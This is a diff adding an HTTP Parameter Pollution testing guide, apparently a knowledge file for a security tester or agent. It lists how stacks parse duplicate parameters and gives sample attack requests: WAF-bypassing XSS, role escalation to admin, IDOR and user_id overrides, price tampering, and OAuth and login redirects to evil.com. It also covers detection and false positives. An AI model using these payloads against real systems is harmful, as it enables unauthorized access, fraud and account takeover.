@@ -1,0 +1,295 @@
+<parameter_pollution_guide>
+<title>HTTP PARAMETER POLLUTION (HPP)</title>
+
+<critical>HTTP Parameter Pollution exploits how applications handle duplicate parameters. Different technologies parse duplicate parameters differently - some take the first value, some the last, some combine them. This inconsistency enables WAF bypasses, logic flaws, and authorization bypass when front-end and back-end systems handle parameters differently.</critical>
+
+<scope>
+- Server-side HPP (different parsing between components)
+- Client-side HPP (polluting URLs for victim clicks)
+- WAF/IDS bypass via parameter fragmentation
+- Business logic bypass through parameter precedence
+- IDOR via parameter pollution
+- Authentication/authorization bypass
+</scope>
+
+<methodology>
+1. Identify all parameter entry points (query string, POST body, cookies, headers).
+2. Determine parameter parsing behavior by submitting duplicate parameters.
+3. Test for parsing differentials between WAF/proxy and application.
+4. Exploit precedence differences for logic bypass.
+5. Combine with other vulnerabilities for amplified impact.
+</methodology>
+
+<parsing_behaviors>
+<technology_parsing>
+{% raw %}
+# Technology-specific parameter handling for ?a=1&a=2
+
+# First occurrence wins:
+- Apache/PHP (in some configs)
+- IBM HTTP Server
+
+# Last occurrence wins:
+- ASP.NET/IIS
+- Python/Django
+- Express.js/Node.js
+
+# Array/list of values:
+- PHP (with a[]=1&a[]=2 syntax)
+- Ruby on Rails
+- Python/Flask (via getlist())
+
+# Comma-separated:
+- Apache/mod_perl (sometimes)
+- Some Java frameworks
+
+# First occurrence + comma:
+- Google App Engine
+{% endraw %}
+</technology_parsing>
+
+<detection_technique>
+{% raw %}
+# Submit duplicate parameters and observe behavior
+GET /api?param=first&param=second HTTP/1.1
+
+# Possible responses indicate parsing:
+# "first" - First value wins
+# "second" - Last value wins
+# "first,second" - Concatenated
+# ["first","second"] - Array
+# "firstsecond" - No delimiter concatenation
+{% endraw %}
+</detection_technique>
+</parsing_behaviors>
+
+<attack_vectors>
+<waf_bypass>
+{% raw %}
+# WAF checks first param, app uses last
+GET /search?q=safe&q=<script>alert(1)</script> HTTP/1.1
+
+# WAF checks last param, app uses first
+GET /search?q=<script>alert(1)</script>&q=safe HTTP/1.1
+
+# Parameter fragmentation
+GET /search?q=<scr&q=ipt>alert(1)</script> HTTP/1.1
+
+# Mixed GET/POST pollution
+POST /action?admin=false HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+admin=true
+{% endraw %}
+</waf_bypass>
+
+<authorization_bypass>
+{% raw %}
+# Override user ID in API
+POST /api/update-profile?user_id=attacker HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+user_id=victim&name=updated
+
+# Role escalation
+POST /api/user?role=user HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+role=admin&email=attacker@evil.com
+
+# Token override
+GET /reset?token=invalid&token=leaked_valid_token HTTP/1.1
+{% endraw %}
+</authorization_bypass>
+
+<business_logic>
+{% raw %}
+# Price manipulation
+POST /checkout HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+price=100&price=1&item_id=expensive_item
+
+# Quantity manipulation
+POST /cart/add HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+qty=1&qty=1000&apply_discount=true
+
+# Redirect manipulation
+GET /login?next=/dashboard&next=//evil.com HTTP/1.1
+{% endraw %}
+</business_logic>
+
+<client_side_hpp>
+{% raw %}
+# Social sharing URL pollution
+https://victim.com/share?url=safe.com&url=evil.com
+
+# Callback URL pollution
+https://victim.com/auth?callback=legit.com&callback=evil.com
+
+# Referer-based attacks
+https://victim.com/vote?id=123&id=attacker_id
+{% endraw %}
+</client_side_hpp>
+</attack_vectors>
+
+<encoding_variations>
+<parameter_encoding>
+{% raw %}
+# URL encoding variations
+?param=value&param%3Dvalue2
+?param=value&%70aram=value2
+?param=value&para%6D=value2
+
+# Null byte injection
+?param=value%00&param=value2
+
+# Unicode encoding
+?param=value&%u0070aram=value2
+
+# Case variations (if case-insensitive)
+?Param=first&param=second&PARAM=third
+
+# Array notation
+?param[]=first&param[]=second
+?param[0]=first&param[1]=second
+{% endraw %}
+</parameter_encoding>
+
+<body_encoding>
+{% raw %}
+# JSON with duplicate keys
+{"user": "attacker", "user": "victim"}
+
+# Form data with semicolon separator
+param=value1;param=value2
+
+# Multipart boundary manipulation
+--boundary
+Content-Disposition: form-data; name="param"
+
+value1
+--boundary
+Content-Disposition: form-data; name="param"
+
+value2
+--boundary--
+{% endraw %}
+</body_encoding>
+</encoding_variations>
+
+<exploitation_scenarios>
+<idor_via_hpp>
+{% raw %}
+# Front-end validates first ID, back-end uses last
+GET /api/document?id=user_owned_doc&id=other_user_doc HTTP/1.1
+Authorization: Bearer valid_token
+
+# POST body vs query string
+POST /api/message?recipient=self HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+recipient=victim&message=spam
+{% endraw %}
+</idor_via_hpp>
+
+<oauth_hpp>
+{% raw %}
+# Redirect URI pollution
+GET /oauth/authorize?redirect_uri=https://legit.com&redirect_uri=https://evil.com HTTP/1.1
+
+# Scope escalation
+GET /oauth/authorize?scope=read&scope=admin HTTP/1.1
+
+# Client ID manipulation
+GET /oauth/token?client_id=legit&client_id=attacker HTTP/1.1
+{% endraw %}
+</oauth_hpp>
+
+<api_endpoint_bypass>
+{% raw %}
+# Bypass API rate limiting
+GET /api/data?api_key=limited_key&api_key=unlimited_key HTTP/1.1
+
+# Feature flag manipulation
+GET /api/feature?beta=false&beta=true HTTP/1.1
+
+# Version routing
+GET /api/users?version=v1&version=v2_insecure HTTP/1.1
+{% endraw %}
+</api_endpoint_bypass>
+</exploitation_scenarios>
+
+<detection>
+<manual_testing>
+{% raw %}
+# Step 1: Identify parameters
+- Map all input parameters in application
+- Note which are security-sensitive
+
+# Step 2: Duplicate parameter test
+- Submit same parameter twice with different values
+- Observe which value the application uses
+- Check response for both values
+
+# Step 3: Boundary testing
+- Test GET vs POST precedence
+- Test header vs body precedence
+- Test array notation handling
+{% endraw %}
+</manual_testing>
+
+<automation_indicators>
+{% raw %}
+# Look for:
+- Multiple values in responses when one submitted
+- Inconsistent validation errors
+- Different behavior based on parameter position
+- Proxy/WAF vs application discrepancies
+{% endraw %}
+</automation_indicators>
+</detection>
+
+<validation>
+1. Demonstrate parsing differential between components (WAF accepts, app uses different value).
+2. Show authorization bypass through parameter precedence manipulation.
+3. Prove business logic flaw exploitable via duplicate parameters.
+4. Document the exact technology stack and their parsing behaviors.
+5. Provide minimal reproduction showing value precedence differences.
+</validation>
+
+<false_positives>
+- Application consistently uses first or last value only
+- Validation applied after parameter merging
+- Arrays explicitly handled and validated
+- WAF and application use same parsing library
+- Duplicate parameters cause explicit error
+</false_positives>
+
+<impact>
+- WAF/security control bypass
+- Authorization and access control bypass
+- IDOR through parameter precedence
+- Business logic manipulation
+- Price/quantity manipulation in e-commerce
+- Account takeover via OAuth pollution
+- Client-side parameter pollution for phishing
+</impact>
+
+<pro_tips>
+1. Always test both query string and POST body simultaneously.
+2. Check if array notation (param[]) behaves differently than duplicates.
+3. Test encoding variations - %70aram vs param may parse differently.
+4. Mobile APIs often have inconsistent parameter parsing.
+5. GraphQL with REST adapters may have HPP vectors.
+6. JSON duplicate keys are parsed differently by libraries.
+7. Content-Type switching may enable new HPP vectors.
+8. Test parameter order - sometimes middle values are used.
+9. Cookie parameters can also be polluted.
+10. WAF configuration often differs from application parsing.
+</pro_tips>
+
+<remember>HPP exploits the fundamental inconsistency in how HTTP parameters are parsed across the technology stack. Security controls often parse parameters differently than applications, creating bypass opportunities. Always map the full request path and test parameter handling at each stage.</remember>
+</parameter_pollution_guide>
